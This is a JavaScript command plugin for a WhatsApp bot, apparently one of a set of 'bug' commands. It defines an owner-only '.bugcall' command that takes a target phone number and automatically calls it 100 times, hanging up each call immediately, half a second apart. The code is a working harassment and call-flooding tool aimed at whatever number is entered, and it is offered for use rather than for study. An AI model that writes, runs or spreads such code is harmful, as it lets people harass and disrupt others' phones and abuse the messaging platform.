const { cmd } = require('../command');
const config = require('../config');

cmd({
  pattern: 'bugcall',
  desc: 'Owner only: call target 100 times and cut call immediately',
  category: 'bug',
  react: '📞',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    if (cmdName !== 'bugcall') return;

    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const isOwner = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')].includes(senderId);
    if (!isOwner) {
      return await bot.sendMessage(from, { text: '*📛 This is an owner-only command*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];
    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, { text: '❌ Usage: .bugcall <number>' }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    await bot.sendMessage(from, { text: `📞 Starting bugcall on +${targetNumber} for 100 calls...` }, { quoted: mek });

    for (let i = 0; i < 100; i++) {
      // Kòmanse apèl la
      await bot.callUser(targetJid);

      // Koupe apèl la imedyatman (oswa apre yon ti tan)
      await bot.endCall(targetJid);

      // Ti delay ant apèl yo
      await new Promise(r => setTimeout(r, 500)); 
    }

    await bot.sendMessage(from, { text: `✅ Bugcall finished: 100 calls to +${targetNumber}` }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
